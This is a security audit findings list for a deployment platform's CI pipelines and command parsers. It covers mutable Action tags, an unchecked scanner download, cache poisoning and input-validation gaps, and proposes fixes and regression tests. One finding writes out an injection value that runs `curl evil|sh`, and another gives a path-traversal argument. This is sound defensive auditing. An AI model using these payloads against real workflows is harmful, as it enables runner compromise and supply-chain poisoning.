# Findings 09 — Webhooks / CI supply chain / external input

Known findings excluded per scope: deploy-project.yml inputs interpolation (SEC-0010), platform-test.yml pull_request_target PR-head execution (SEC-0009), cache poisoning split out as SEC-0040. Telegram: no listener exists (outbound senders only) — no webhook surface. Replay of captured receive stdin judged NOT a standalone threat: key possession already authorizes any new payload; SSH integrity prevents network replay; rollback-via-replay ≡ rollback-via-redeploy (fix-forward-guarded). Document, don't engineer.

## SEC-0038 — All external GitHub Actions pinned to mutable tags (22 refs, zero SHA pins) — third-party included
- **Severity:** HIGH · **Attack surface:** every CI workflow; jobs hold VPS_SSH_KEY / CI_DEPLOY_KEY / AGE_SECRET_KEY scope · **Confidence:** 1.0 · **Must fix before launch: YES** (third-party refs at minimum)
- **Files:** examples: `core-deploy.yml:93` (`actions/checkout@v7`), `platform-test.yml:166,175,185` (`docker/setup-buildx-action@v4`, `login-action@v4`), `security-scan.yml:88` (**third-party aquasecurity/trivy-action@v0.36.0**), `:108` (`codeql-action/upload-sarif@v4`), `deploy-project.yml:97,177`
- **Preconditions:** upstream tag move (org takeover, maintainer error, force-push). No access to this repo needed.
- **Attack path:** tag re-pointed to malicious commit → next scheduled/push run resolves mutable ref → action code executes with root-deploy secrets → VPS root via core-deploy.yml:263. Repo digest-pins container images but nothing pins actions.
- **Minimal fix:** pin all 22 refs to full commit SHAs (`<action>@<sha> # vX`); dependabot already handles updates; prioritize trivy-action + codeql-action.
- **Regression test:** gate scanning .github/workflows/** + .github/actions/** for uses: refs not matching `@[0-9a-f]{40}`.

## SEC-0039 — setup-gitleaks downloads release binary without checksum verification (security control itself unpinned)
- **Severity:** MEDIUM · **Confidence:** 0.95 · **Must fix before launch: YES** (one-line fix; swapped gitleaks silently stops detecting leaks)
- **Files:** `.github/actions/setup-gitleaks/action.yml:39-42` (curl release tarball → extract into /usr/local/bin/gitleaks; version interpolated into URL unvalidated; cached at stable key — see SEC-0040)
- **Attack path:** release asset substitution → trojaned scanner runs in every job env (TELEGRAM_*, Docker Hub token, GITHUB_TOKEN).
- **Minimal fix:** embed expected SHA256 per version; verify after download before extraction.
- **Regression test:** assert action file contains checksum step; download-and-verify smoke step.

## SEC-0040 — Cache-persistence amplifier: pull_request_target can poison base-repo caches that outlive the PR
- **Severity:** MEDIUM · **Confidence:** 0.8 · **Must fix:** NO (precondition overlaps SEC-0009, but persistence survives PR close/revert/rebase)
- **Files:** `platform-test.yml:107,133-136` (pre-commit venv cache keyed by PR-head hashFiles); `setup-gitleaks/action.yml:31-34` (cache path **/usr/local/bin/gitleaks**, fixed key regardless of branch)
- **Attack path:** malicious PR (privileged base-context run) swaps gitleaks binary or venv hooks mid-run → cache-save persists under stable key → all subsequent main runs restore trojaned scanner/backdoor even after PR deletion.
- **Minimal fix:** skip cache restore/save when event == pull_request_target (or scope keys with github.sha for PR events); never cache system paths like /usr/local/bin in PR-runnable workflows.
- **Regression test:** lint gate asserting actions/cache steps in pull_request_target-triggerable workflows carry event guards.

## SEC-0041 — hermes-nightly dispatch input interpolated unquoted into run: shell
- **Severity:** LOW-MED (requires workflow_dispatch = write access) · **Confidence:** 0.9 · **Must fix:** NO
- **Files:** `.github/workflows/hermes-nightly.yml:49` (`CONTEXT: ${{ inputs.context || 'tronyx' }}`) → raw interpolation `:72,:76,:86,:104` (incl. telegram message)
- **Attack path:** dispatch with `context='tronyx$(curl evil|sh)'` → executes on runner with GITHUB_TOKEN ghcr push scope → poisoned L2 image pushed to ghcr consumed by nodes at next node-update; CONTEXT also flows into ensure_context_repo git naming.
- **Minimal fix:** keep `${{ }}` solely in env: mapping; add regex validation `^[a-z][a-z0-9-]*$` in build/hermes_images.py.
- **Regression test:** actionlint-style gate forbidding `${{ env.`/`${{ inputs.` inside run: blocks of all workflows.

## SEC-0042 — `receive <project> <sha>` version token accepted with zero format/count validation → arbitrary IMAGE_TAG pulls defeat sha-pinning intent
- **Severity:** LOW · **Confidence:** 0.85 · **Must fix:** NO
- **Files:** `ssh_command_parser.py:184-186` (args = whole remainder); `orchestrator_cli.py:459-461` (`tokens[1] if len(tokens)>1 else "latest"`, extras silently dropped); downstream `engine/flow.py:60,79` (IMAGE_TAG env), audit records `receive_flow.py:563`
- **Attack path:** key holder sends non-hex version → compose deploys any tag within image repo (stale/attacker-pushed tag defeating D5 pinning intent); audit trail records wrong version.
- **Minimal fix:** enforce `^[0-9a-f]{40}|[0-9a-f]{7}|latest$`; reject len(tokens)>2.
- **Regression test:** dispatcher tests with junk versions + 3-token form → exit 4/1, no orchestrator call.

## SEC-0043 — `verify <node>` verb: node token bypasses T9.7/H7 validation discipline applied to projects
- **Severity:** LOW · **Confidence:** 0.75 · **Must fix:** NO
- **Files:** `orchestrator_cli.py:364-388` (validates only project; comment :370-373 documents exactly this gap class closed for project, node left open); path join `node_yaml/resolve.py:69-71`; caller-side TARGET_NODE also unvalidated (`deploy-project.yml:112-118,384`)
- **Attack path:** `verify ../../<ctx>/node-configs/tronyx-vps` selects arbitrary node.yaml tree; verifier probes its domains. List-based argv = no shell injection; path-shape abuse only.
- **Minimal fix:** same name regex for node in `_handle_verify` + TARGET_NODE format check in workflow.
- **Regression test:** dispatcher test `verify '../x'` → exit 1 JSON ERROR.

## SEC-0044 — Prometheus exposition escaping bug in status-page `/metrics` label construction
- **Severity:** LOW-MED (bug certain; exploitability weak today) · **Confidence:** 0.85 / 0.3 · **Must fix:** NO
- **Files:** `core/modules/status-page/app.py:226-231` (`str(name).replace('"','\\"')` — backslash not escaped first, newlines not escaped at all); `node_name` raw at :214,218
- **Preconditions:** `\n`/`\` reaching name/image fields in status-metrics.json — sources are operator-managed today; live the moment any project-supplied string flows in.
- **Attack path:** crafted value breaks exposition line → forged metric series feeding alerts (PlatformBackupStale, deploy SLO) or broken scrape parse.
- **Minimal fix:** proper escape helper (`\\` → `\"` → `\n` ordering) applied to all four label values.
- **Regression test:** fixture metrics JSON containing \n, \", trailing \ → assertion on exposition line count.
